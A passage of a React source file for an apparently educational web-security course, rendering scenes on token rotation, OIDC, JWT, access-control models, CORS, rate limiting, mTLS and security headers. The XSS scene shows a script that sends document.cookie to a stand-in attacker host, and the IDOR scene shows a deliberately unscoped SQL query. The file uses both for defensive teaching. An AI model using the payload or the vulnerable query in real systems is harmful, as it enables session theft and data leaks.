          <div className="text-zinc-500 text-[10px] uppercase">Token 1 (RT_1)</div>
          <div className="text-rose-400 font-bold line-through">Consumed &amp; Burned</div>
          <div className="text-[9px] text-zinc-500">Stored in revocation history</div>
        </div>
        <div className="p-3 rounded-xl bg-zinc-950 border border-zinc-800 space-y-1">
          <div className="text-zinc-500 text-[10px] uppercase">Token 2 (RT_2)</div>
          <div className="text-rose-400 font-bold line-through">Consumed &amp; Burned</div>
          <div className="text-[9px] text-zinc-500">Rotated upon usage</div>
        </div>
        <div className="p-3 rounded-xl bg-zinc-900 border border-emerald-500/50 space-y-1">
          <div className="text-emerald-400 text-[10px] uppercase font-bold">Token 3 (RT_3)</div>
          <div className="text-emerald-400 font-bold">Active Valid Token</div>
          <div className="text-[9px] text-zinc-400">Currently held by client</div>
        </div>
      </div>
      <div className="p-3 rounded-xl bg-zinc-950 border border-zinc-800 text-[11px] text-zinc-400">
        <span className="text-rose-400 font-bold">Breach Detection Trigger: </span>
        If an attacker attempts to replay burned <code className="text-zinc-200">RT_1</code>, the server detects token reuse, sounds an alarm, and immediately revokes the ENTIRE token family (RT_1, RT_2, RT_3)!
      </div>
    </div>
  );
}

// -------------------------------------------------------------
// 15. openid-connect-oidc-identity
// -------------------------------------------------------------
export function SceneOidcIdentity({ step }: SceneProps) {
  return (
    <div className="grid md:grid-cols-2 gap-4 text-xs font-mono">
      <div className="p-4 rounded-2xl bg-zinc-900 border border-zinc-800 space-y-2">
        <div className="flex items-center justify-between border-b border-zinc-800 pb-1">
          <span className="text-emerald-400 font-bold">ID Token (OpenID Connect)</span>
          <span className="text-[10px] text-zinc-500">For Client App</span>
        </div>
        <div className="p-3 rounded-xl bg-zinc-950 border border-zinc-800 text-[11px] space-y-1">
          <div><span className="text-zinc-500">Format:</span> Signed JWT</div>
          <div><span className="text-zinc-500">Contains:</span> sub, email, name, nonce</div>
          <div><span className="text-zinc-500">Purpose:</span> Proves WHO the authenticated user is</div>
        </div>
      </div>

      <div className="p-4 rounded-2xl bg-zinc-900 border border-zinc-800 space-y-2">
        <div className="flex items-center justify-between border-b border-zinc-800 pb-1">
          <span className="text-zinc-200 font-bold">Access Token (OAuth 2.0)</span>
          <span className="text-[10px] text-zinc-500">For Resource Server</span>
        </div>
        <div className="p-3 rounded-xl bg-zinc-950 border border-zinc-800 text-[11px] space-y-1">
          <div><span className="text-zinc-500">Format:</span> Opaque String or JWT</div>
          <div><span className="text-zinc-500">Contains:</span> scope, aud, exp</div>
          <div><span className="text-zinc-500">Purpose:</span> Proves WHAT API resources can be invoked</div>
        </div>
      </div>
    </div>
  );
}

// -------------------------------------------------------------
// 16. enterprise-sso-saml-vs-oidc
// -------------------------------------------------------------
export function SceneSamlVsOidc({ step }: SceneProps) {
  return (
    <div className="grid md:grid-cols-2 gap-4 text-xs font-mono">
      <div className="p-4 rounded-2xl bg-zinc-900 border border-zinc-800 space-y-2">
        <div className="text-zinc-300 font-bold">SAML 2.0 (Legacy Enterprise)</div>
        <div className="p-3 rounded-xl bg-zinc-950 border border-zinc-800 text-[10px] space-y-1 text-zinc-400">
          <div>• Heavy XML-DSig signature wrapping</div>
          <div>• POST binding via browser form redirect</div>
          <div>• Prone to XML External Entity (XXE) parser flaws</div>
        </div>
      </div>

      <div className="p-4 rounded-2xl bg-zinc-900 border border-emerald-500/40 space-y-2">
        <div className="text-emerald-400 font-bold">OpenID Connect (Modern Standard)</div>
        <div className="p-3 rounded-xl bg-zinc-950 border border-zinc-800 text-[10px] space-y-1 text-zinc-300">
          <div>• Compact JSON Web Tokens (JWS / JWE)</div>
          <div>• Native mobile and SPA support via PKCE</div>
          <div>• Simple HTTP GET /.well-known/openid-configuration</div>
        </div>
      </div>
    </div>
  );
}

// -------------------------------------------------------------
// 17. jwt-architecture-claims
// -------------------------------------------------------------
export function SceneJwtClaims({ step }: SceneProps) {
  return (
    <div className="grid md:grid-cols-3 gap-3 text-xs font-mono">
      <div className="p-3.5 rounded-xl bg-zinc-900 border border-rose-500/30 space-y-1.5">
        <div className="text-rose-400 font-bold text-[11px]">1. Header (Algorithm)</div>
        <pre className="text-[10px] text-rose-300 overflow-x-auto">{`{
  "alg": "RS256",
  "typ": "JWT"
}`}</pre>
      </div>

      <div className="p-3.5 rounded-xl bg-zinc-900 border border-emerald-500/30 space-y-1.5">
        <div className="text-emerald-400 font-bold text-[11px]">2. Payload (Claims)</div>
        <pre className="text-[10px] text-emerald-300 overflow-x-auto">{`{
  "sub": "usr_42",
  "role": "admin",
  "exp": 1735689600
}`}</pre>
      </div>

      <div className="p-3.5 rounded-xl bg-zinc-900 border border-zinc-700 space-y-1.5">
        <div className="text-zinc-200 font-bold text-[11px]">3. Digital Signature</div>
        <div className="text-[10px] text-zinc-400 leading-snug">
          RS256(header.payload, privateKey)
          <div className="text-emerald-400 font-bold mt-1">Cryptographically Sealed</div>
        </div>
      </div>
    </div>
  );
}

// -------------------------------------------------------------
// 18. jwt-digital-signatures-rs256
// -------------------------------------------------------------
export function SceneJwtSignatures({ step }: SceneProps) {
  const [tampered, setTampered] = useState(false);

  return (
    <div className="space-y-4 text-xs font-mono">
      <div className="grid md:grid-cols-2 gap-4">
        <div className="p-4 rounded-2xl bg-zinc-900 border border-zinc-800 space-y-2">
          <div className="text-emerald-400 font-bold text-[11px]">Private Key Signing (IdP)</div>
          <div className="p-3 rounded-xl bg-zinc-950 border border-zinc-800 text-[11px] text-zinc-300">
            IdP signs token using RSA 2048-bit Private Key stored in HSM/KMS. Private key never leaves the identity server.
          </div>
        </div>

        <div className="p-4 rounded-2xl bg-zinc-900 border border-zinc-800 space-y-2">
          <div className="text-emerald-400 font-bold text-[11px]">Public Key Verification (Microservices)</div>
          <div className="p-3 rounded-xl bg-zinc-950 border border-zinc-800 text-[11px] text-zinc-300">
            100+ microservices verify the signature using the cached Public Key from JWKS with 0 database roundtrips.
          </div>
        </div>
      </div>

      <div className="p-3 rounded-xl bg-zinc-950 border border-zinc-800 flex items-center justify-between">
        <span className="text-zinc-400">Simulate Payload Tampering (role: user &rarr; admin):</span>
        <button
          onClick={() => setTampered(!tampered)}
          className={`px-3 py-1 rounded-lg text-xs font-bold transition ${
            tampered ? 'bg-rose-600 text-white' : 'bg-zinc-800 text-zinc-300'
          }`}
        >
          {tampered ? 'Payload Tampered (Signature Mismatch!)' : 'Original Payload (Valid)'}
        </button>
      </div>
    </div>
  );
}

// -------------------------------------------------------------
// 19. jwks-key-rotation-caching
// -------------------------------------------------------------
export function SceneJwksRotation({ step }: SceneProps) {
  return (
    <div className="space-y-3 text-xs font-mono">
      <div className="p-4 rounded-2xl bg-zinc-900 border border-zinc-800 space-y-2">
        <div className="text-emerald-400 font-bold text-[11px]">JWKS Discovery Endpoint: /.well-known/jwks.json</div>
        <div className="grid md:grid-cols-2 gap-3 text-[10px]">
          <div className="p-2.5 rounded-xl bg-zinc-950 border border-zinc-800">
            <span className="text-zinc-400 font-bold">Active Key (kid: &quot;key_2026_b&quot;):</span>
            <div className="text-emerald-400 mt-1">Signs all newly issued tokens</div>
          </div>
          <div className="p-2.5 rounded-xl bg-zinc-950 border border-zinc-800">
            <span className="text-zinc-400 font-bold">Previous Key (kid: &quot;key_2026_a&quot;):</span>
            <div className="text-zinc-400 mt-1">Retained for 24h grace period to verify existing tokens</div>
          </div>
        </div>
      </div>
    </div>
  );
}

// -------------------------------------------------------------
// 20. jwt-revocation-blacklisting
// -------------------------------------------------------------
export function SceneJwtRevocation({ step }: SceneProps) {
  return (
    <div className="grid md:grid-cols-2 gap-4 text-xs font-mono">
      <div className="p-4 rounded-2xl bg-zinc-900 border border-zinc-800 space-y-2">
        <div className="text-emerald-400 font-bold text-[11px]">Stateless Fast-Path</div>
        <div className="p-3 rounded-xl bg-zinc-950 border border-zinc-800 text-[11px] text-zinc-300">
          Token has unique ID: <code className="text-emerald-400">jti: &quot;uuid_99&quot;</code> and 15m expiration. Verified locally with 0 DB latency.
        </div>
      </div>

      <div className="p-4 rounded-2xl bg-zinc-900 border border-zinc-800 space-y-2">
        <div className="text-rose-400 font-bold text-[11px]">Emergency Redis JTI Blacklist</div>
        <div className="p-3 rounded-xl bg-zinc-950 border border-zinc-800 text-[11px] text-zinc-300">
          On logout or security alert: <code className="text-rose-400">SETEX blacklist:uuid_99 900 &quot;revoked&quot;</code>. Gateway drops token immediately.
        </div>
      </div>
    </div>
  );
}

// -------------------------------------------------------------
// 21. rbac-role-based-access
// -------------------------------------------------------------
export function SceneRbac({ step }: SceneProps) {
  const [role, setRole] = useState<'Viewer' | 'Editor' | 'Admin'>('Editor');

  const permissions = {
    Viewer: { read: true, create: false, edit: false, delete: false, billing: false },
    Editor: { read: true, create: true, edit: true, delete: false, billing: false },
    Admin: { read: true, create: true, edit: true, delete: true, billing: true },
  };

  const perms = permissions[role];

  return (
    <div className="space-y-4 text-xs font-mono">
      <div className="flex items-center justify-between p-3 rounded-xl bg-zinc-950 border border-zinc-800">
        <span className="text-zinc-400">Select Role:</span>
        <div className="flex gap-2">
          {(['Viewer', 'Editor', 'Admin'] as const).map((r) => (
            <button
              key={r}
              onClick={() => setRole(r)}
              className={`px-3 py-1 rounded-lg text-xs font-bold transition ${
                role === r ? 'bg-emerald-600 text-white' : 'bg-zinc-800 text-zinc-400'
              }`}
            >
              {r}
            </button>
          ))}
        </div>
      </div>

      <div className="grid grid-cols-5 gap-2 text-center text-[10px]">
        {Object.entries(perms).map(([p, allowed]) => (
          <div key={p} className={`p-2 rounded-xl border ${allowed ? 'bg-emerald-500/10 border-emerald-500/30 text-emerald-400' : 'bg-zinc-950 border-zinc-800 text-zinc-600'}`}>
            <div className="uppercase font-bold">{p}</div>
            <div className="mt-1">{allowed ? 'ALLOWED ✅' : 'DENIED ❌'}</div>
          </div>
        ))}
      </div>
    </div>
  );
}

// -------------------------------------------------------------
// 22. abac-attribute-based-access
// -------------------------------------------------------------
export function SceneAbac({ step }: SceneProps) {
  const [time, setTime] = useState<'day' | 'night'>('day');
  const [network, setNetwork] = useState<'intranet' | 'vpn' | 'public'>('intranet');

  const permit = time === 'day' && network !== 'public';

  return (
    <div className="space-y-3 text-xs font-mono">
      <div className="p-4 rounded-2xl bg-zinc-900 border border-zinc-800 space-y-2">
        <div className="flex items-center justify-between border-b border-zinc-800 pb-1">
          <span className="text-emerald-400 font-bold">Policy Decision Point (PDP) 4D Evaluation</span>
          <span className={`px-2 py-0.5 rounded text-[10px] font-bold ${permit ? 'bg-emerald-500/20 text-emerald-400' : 'bg-rose-500/20 text-rose-400'}`}>
            {permit ? 'PERMIT (200 OK)' : 'DENY (403 Forbidden)'}
          </span>
        </div>
        <div className="grid md:grid-cols-4 gap-2 text-[10px] pt-1">
          <div className="p-2 rounded-lg bg-zinc-950 border border-zinc-800">
            <span className="text-zinc-500 block">Subject:</span> Doctor (Dept: Cardiology)
          </div>
          <div className="p-2 rounded-lg bg-zinc-950 border border-zinc-800">
            <span className="text-zinc-500 block">Resource:</span> Medical Record (Confidential)
          </div>
          <div className="p-2 rounded-lg bg-zinc-950 border border-zinc-800">
            <span className="text-zinc-500 block">Environment Time:</span> {time === 'day' ? '14:30 (Shift Hours)' : '03:15 (Off Shift)'}
          </div>
          <div className="p-2 rounded-lg bg-zinc-950 border border-zinc-800">
            <span className="text-zinc-500 block">Client IP:</span> {network}
          </div>
        </div>
      </div>

      <div className="flex flex-wrap items-center justify-between gap-3 p-3 rounded-xl bg-zinc-950 border border-zinc-800 text-[11px]">
        <div className="flex items-center gap-2">
          <span className="text-zinc-400">Time:</span>
          <button onClick={() => setTime(time === 'day' ? 'night' : 'day')} className="px-2 py-1 rounded bg-zinc-800 text-zinc-200">
            {time === 'day' ? 'Day Shift' : 'Night (Off-Duty)'}
          </button>
        </div>
        <div className="flex items-center gap-2">
          <span className="text-zinc-400">Network:</span>
          {(['intranet', 'vpn', 'public'] as const).map((n) => (
            <button
              key={n}
              onClick={() => setNetwork(n)}
              className={`px-2 py-1 rounded capitalize ${network === n ? 'bg-emerald-600 text-white' : 'bg-zinc-800 text-zinc-400'}`}
            >
              {n}
            </button>
          ))}
        </div>
      </div>
    </div>
  );
}

// -------------------------------------------------------------
// 23. rebac-relationship-based-access
// -------------------------------------------------------------
export function SceneRebac({ step }: SceneProps) {
  return (
    <div className="p-4 rounded-2xl bg-zinc-900 border border-zinc-800 text-xs font-mono space-y-2">
      <div className="text-emerald-400 font-bold text-[11px]">Google Zanzibar Relationship Graph Traversal</div>
      <div className="flex flex-wrap items-center gap-2 p-3 rounded-xl bg-zinc-950 border border-zinc-800 text-[11px]">
        <span className="px-2 py-1 rounded bg-emerald-500/20 text-emerald-400 font-bold">Alice</span>
        <span className="text-zinc-600">&rarr; member_of &rarr;</span>
        <span className="px-2 py-1 rounded bg-zinc-800 text-zinc-300">Team Platform</span>
        <span className="text-zinc-600">&rarr; owner_of &rarr;</span>
        <span className="px-2 py-1 rounded bg-zinc-800 text-zinc-300">Project Apollo</span>
        <span className="text-zinc-600">&rarr; parent_of &rarr;</span>
        <span className="px-2 py-1 rounded bg-emerald-500/20 text-emerald-400 font-bold">Document: Roadmap</span>
      </div>
      <div className="text-[10px] text-zinc-400">
        Access is derived recursively through relational tuples (<code className="text-zinc-300">user:alice#member@team:platform</code>).
      </div>
    </div>
  );
}

// -------------------------------------------------------------
// 24. idor-bola-object-authorization
// -------------------------------------------------------------
export function SceneIdorBola({ step }: SceneProps) {
  const [scoped, setScoped] = useState(true);

  return (
    <div className="space-y-3 text-xs font-mono">
      <div className="p-4 rounded-2xl bg-zinc-900 border border-zinc-800 space-y-2">
        <div className="flex items-center justify-between border-b border-zinc-800 pb-1">
          <span className="text-zinc-300 font-bold">GET /api/documents/1042</span>
          <span className={`px-2 py-0.5 rounded text-[10px] font-bold ${scoped ? 'bg-emerald-500/20 text-emerald-400' : 'bg-rose-500/20 text-rose-400'}`}>
            {scoped ? '404 NOT FOUND (SECURE)' : '200 OK (LEAKED DATA!)'}
          </span>
        </div>
        <pre className={`p-3 rounded-xl border text-[11px] overflow-x-auto ${scoped ? 'bg-emerald-950/20 border-emerald-500/30 text-emerald-300' : 'bg-rose-950/20 border-rose-500/30 text-rose-300'}`}>
          {scoped
            ? 'SELECT * FROM documents WHERE id = 1042 AND tenant_id = current_user.tenant_id;'
            : 'SELECT * FROM documents WHERE id = 1042; -- Vulnerable to BOLA!'}
        </pre>
      </div>

      <div className="flex items-center justify-between p-3 rounded-xl bg-zinc-950 border border-zinc-800">
        <span className="text-zinc-400">Tenant Filter Mode:</span>
        <button
          onClick={() => setScoped(!scoped)}
          className={`px-3 py-1 rounded-lg text-xs font-bold transition ${
            scoped ? 'bg-emerald-600 text-white' : 'bg-rose-600 text-white'
          }`}
        >
          {scoped ? 'Tenant Scoped (Secure)' : 'Naked ID Lookup (Vulnerable)'}
        </button>
      </div>
    </div>
  );
}

// -------------------------------------------------------------
// 25. xss-csp-defense-in-depth
// -------------------------------------------------------------
export function SceneXssCsp({ step }: SceneProps) {
  return (
    <div className="grid md:grid-cols-2 gap-4 text-xs font-mono">
      <div className="p-4 rounded-2xl bg-zinc-900 border border-zinc-800 space-y-2">
        <div className="text-rose-400 font-bold text-[11px]">Injected Malicious Script</div>
        <div className="p-3 rounded-xl bg-zinc-950 border border-zinc-800 text-[10px] text-rose-300">
          &lt;script&gt;fetch(&apos;https://attacker.io/steal&apos;, {'{ body: document.cookie }'})&lt;/script&gt;
        </div>
      </div>

      <div className="p-4 rounded-2xl bg-zinc-900 border border-emerald-500/40 space-y-2">
        <div className="text-emerald-400 font-bold text-[11px]">CSP Nonce Shield</div>
        <div className="p-3 rounded-xl bg-zinc-950 border border-zinc-800 text-[10px] space-y-1">
          <div className="text-zinc-400">Header: script-src &apos;nonce-rAnd0m123&apos;</div>
          <div className="text-emerald-400 font-bold">Browser refuses execution: Injected tag lacks cryptographic nonce!</div>
        </div>
      </div>
    </div>
  );
}

// -------------------------------------------------------------
// 26. cors-security-preflights
// -------------------------------------------------------------
export function SceneCorsPreflight({ step }: SceneProps) {
  return (
    <div className="p-4 rounded-2xl bg-zinc-900 border border-zinc-800 text-xs font-mono space-y-2">
      <div className="text-emerald-400 font-bold text-[11px]">OPTIONS Preflight Handshake</div>
      <div className="grid md:grid-cols-2 gap-3 text-[10px]">
        <div className="p-3 rounded-xl bg-zinc-950 border border-zinc-800 space-y-1">
          <div className="text-zinc-400 font-bold">1. Browser Dispatches OPTIONS:</div>
          <div>Origin: https://app.cosmos.io</div>
          <div>Access-Control-Request-Method: PUT</div>
        </div>
        <div className="p-3 rounded-xl bg-zinc-950 border border-zinc-800 space-y-1">
          <div className="text-emerald-400 font-bold">2. Server Inspects Whitelist:</div>
          <div>Access-Control-Allow-Origin: https://app.cosmos.io</div>
          <div className="text-emerald-400 font-bold">Handshake verified: Real PUT allowed!</div>
        </div>
      </div>
    </div>
  );
}

// -------------------------------------------------------------
// 27. credential-stuffing-rate-limiting
// -------------------------------------------------------------
export function SceneCredentialStuffing({ step }: SceneProps) {
  return (
    <div className="grid md:grid-cols-2 gap-4 text-xs font-mono">
      <div className="p-4 rounded-2xl bg-zinc-900 border border-zinc-800 space-y-2">
        <div className="text-zinc-300 font-bold text-[11px]">Limiter 1: IP Sliding Window</div>
        <div className="p-3 rounded-xl bg-zinc-950 border border-zinc-800 text-[10px] space-y-1">
          <div>Rate: 10 requests / minute / IP</div>
          <div className="text-zinc-500">Defeats naive single-source brute force scripts.</div>
        </div>
      </div>

      <div className="p-4 rounded-2xl bg-zinc-900 border border-emerald-500/40 space-y-2">
        <div className="text-emerald-400 font-bold text-[11px]">Limiter 2: Account Window (Anti-Botnet)</div>
        <div className="p-3 rounded-xl bg-zinc-950 border border-zinc-800 text-[10px] space-y-1">
          <div>Rate: 5 failed attempts / 15m / username</div>
          <div className="text-emerald-400 font-bold">Even when botnet rotates 1,000 IPs, targeted account locks or enforces CAPTCHA!</div>
        </div>
      </div>
    </div>
  );
}

// -------------------------------------------------------------
// 28. api-key-security-design
// -------------------------------------------------------------
export function SceneApiKeyDesign({ step }: SceneProps) {
  return (
    <div className="grid md:grid-cols-2 gap-4 text-xs font-mono">
      <div className="p-4 rounded-2xl bg-zinc-900 border border-zinc-800 space-y-2">
        <div className="text-emerald-400 font-bold text-[11px]">High-Entropy Prefix Architecture</div>
        <div className="p-3 rounded-xl bg-zinc-950 border border-zinc-800 text-[11px] space-y-1">
          <div><span className="text-zinc-500">Key:</span> <span className="text-amber-300 font-bold">sk_live_</span>51Mza...32bytes</div>
          <div className="text-[10px] text-zinc-400">Prefix enables automated GitHub / GitGuardian secret scanning to prevent git commit leaks.</div>
        </div>
      </div>

      <div className="p-4 rounded-2xl bg-zinc-900 border border-zinc-800 space-y-2">
        <div className="text-emerald-400 font-bold text-[11px]">One-Way Hash Storage</div>
        <div className="p-3 rounded-xl bg-zinc-950 border border-zinc-800 text-[11px] space-y-1">
          <div><span className="text-zinc-500">Database stores ONLY:</span> SHA-256(apiKey)</div>
          <div className="text-[10px] text-emerald-400 font-bold">If database is compromised, plaintext API keys are completely unrecoverable!</div>
        </div>
      </div>
    </div>
  );
}

// -------------------------------------------------------------
// 29. mtls-zero-trust-architecture
// -------------------------------------------------------------
export function SceneMtls({ step }: SceneProps) {
  return (
    <div className="p-4 rounded-2xl bg-zinc-900 border border-zinc-800 text-xs font-mono space-y-2">
      <div className="text-emerald-400 font-bold text-[11px]">Mutual TLS (mTLS) Zero-Trust Handshake</div>
      <div className="grid md:grid-cols-2 gap-3 text-[10px]">
        <div className="p-3 rounded-xl bg-zinc-950 border border-zinc-800 space-y-1">
          <div className="text-zinc-300 font-bold">Pod A presents Client X.509 Cert</div>
          <div>Signed by Internal Cluster CA</div>
        </div>
        <div className="p-3 rounded-xl bg-zinc-950 border border-zinc-800 space-y-1">
          <div className="text-zinc-300 font-bold">Pod B presents Server X.509 Cert</div>
          <div>Signed by Internal Cluster CA</div>
        </div>
      </div>
      <div className="text-[10px] text-emerald-400 font-bold pt-1">
        Both sides cryptographically authenticate before any HTTP traffic passes. Compromised lateral movement blocked!
      </div>
    </div>
  );
}

// -------------------------------------------------------------
// 30. http-security-headers-defense
// -------------------------------------------------------------
export function SceneHttpHeaders({ step }: SceneProps) {
  const [headers, setHeaders] = useState({
    hsts: true,
    xframe: true,
    nosniff: true,
    csp: true,
  });

  const toggle = (k: keyof typeof headers) => {
    setHeaders((prev) => ({ ...prev, [k]: !prev[k] }));
  };

  return (
    <div className="space-y-3 text-xs font-mono">
      <div className="grid grid-cols-2 sm:grid-cols-4 gap-2">
        <button
          onClick={() => toggle('hsts')}
          className={`p-2.5 rounded-xl border text-left transition ${headers.hsts ? 'bg-emerald-500/10 border-emerald-500/30 text-emerald-400' : 'bg-zinc-950 border-zinc-800 text-zinc-600'}`}
        >
          <div className="font-bold text-[10px]">HSTS</div>
          <div className="text-[9px] mt-0.5">Enforce HTTPS</div>
        </button>
        <button
          onClick={() => toggle('xframe')}
          className={`p-2.5 rounded-xl border text-left transition ${headers.xframe ? 'bg-emerald-500/10 border-emerald-500/30 text-emerald-400' : 'bg-zinc-950 border-zinc-800 text-zinc-600'}`}
        >
          <div className="font-bold text-[10px]">X-Frame-Options</div>
          <div className="text-[9px] mt-0.5">Anti-Clickjacking</div>
        </button>
        <button
          onClick={() => toggle('nosniff')}
          className={`p-2.5 rounded-xl border text-left transition ${headers.nosniff ? 'bg-emerald-500/10 border-emerald-500/30 text-emerald-400' : 'bg-zinc-950 border-zinc-800 text-zinc-600'}`}
        >
          <div className="font-bold text-[10px]">nosniff</div>
          <div className="text-[9px] mt-0.5">Anti-MIME Confuse</div>
        </button>
        <button
          onClick={() => toggle('csp')}
          className={`p-2.5 rounded-xl border text-left transition ${headers.csp ? 'bg-emerald-500/10 border-emerald-500/30 text-emerald-400' : 'bg-zinc-950 border-zinc-800 text-zinc-600'}`}
        >
          <div className="font-bold text-[10px]">CSP</div>
          <div className="text-[9px] mt-0.5">Anti-XSS Defense</div>
        </button>
      </div>

      <div className="p-3 rounded-xl bg-zinc-950 border border-zinc-800 text-[11px] text-zinc-400">
        Click headers above to test defense-in-depth security configuration!
      </div>
    </div>
  );
}

// -------------------------------------------------------------
// Master Scene Router
// -------------------------------------------------------------
export function renderConceptScene(topicId: string, step: number): React.ReactNode {
  switch (topicId) {
    case 'authn-vs-authz-foundations':
      return <SceneAuthnVsAuthz step={step} />;
    case 'passwords-salting-argon2id':
      return <ScenePasswordHashing step={step} />;
    case 'registration-email-verification':
      return <SceneRegistrationVerification step={step} />;
    case 'account-recovery-password-reset':
      return <SceneAccountRecovery step={step} />;
    case 'session-lifecycle-security':
      return <SceneSessionLifecycle step={step} />;
    case 'cookies-vs-tokens-storage':
      return <SceneCookiesVsTokens step={step} />;
    case 'csrf-protection-synchronizer':
      return <SceneCsrfProtection step={step} />;
    case 'distributed-sessions-redis':
      return <SceneDistributedRedis step={step} />;
    case 'mfa-totp-hotp-rfc6238':
      return <SceneTotpMfa step={step} />;
    case 'webauthn-passkeys-fido2':
      return <SceneWebAuthn step={step} />;
    case 'oauth2-core-framework-roles':
      return <SceneOAuthRoles step={step} />;
    case 'oauth2-pkce-flow-rfc9700':
      return <SceneOAuthPkce step={step} />;
    case 'oauth2-machine-to-machine':
      return <SceneOAuthM2M step={step} />;
    case 'refresh-tokens-rotation':
      return <SceneRefreshTokenRotation step={step} />;
    case 'openid-connect-oidc-identity':
      return <SceneOidcIdentity step={step} />;
    case 'enterprise-sso-saml-vs-oidc':
      return <SceneSamlVsOidc step={step} />;
    case 'jwt-architecture-claims':
      return <SceneJwtClaims step={step} />;
    case 'jwt-digital-signatures-rs256':
      return <SceneJwtSignatures step={step} />;
    case 'jwks-key-rotation-caching':
      return <SceneJwksRotation step={step} />;
    case 'jwt-revocation-blacklisting':
      return <SceneJwtRevocation step={step} />;
    case 'rbac-role-based-access':
      return <SceneRbac step={step} />;
    case 'abac-attribute-based-access':
      return <SceneAbac step={step} />;
    case 'rebac-relationship-based-access':
      return <SceneRebac step={step} />;
    case 'idor-bola-object-authorization':
      return <SceneIdorBola step={step} />;
    case 'xss-csp-defense-in-depth':
      return <SceneXssCsp step={step} />;
    case 'cors-security-preflights':
      return <SceneCorsPreflight step={step} />;
    case 'credential-stuffing-rate-limiting':
      return <SceneCredentialStuffing step={step} />;
    case 'api-key-security-design':
      return <SceneApiKeyDesign step={step} />;
    case 'mtls-zero-trust-architecture':
      return <SceneMtls step={step} />;
    case 'http-security-headers-defense':
      return <SceneHttpHeaders step={step} />;
    default:
      return <SceneAuthnVsAuthz step={step} />;
  }
}
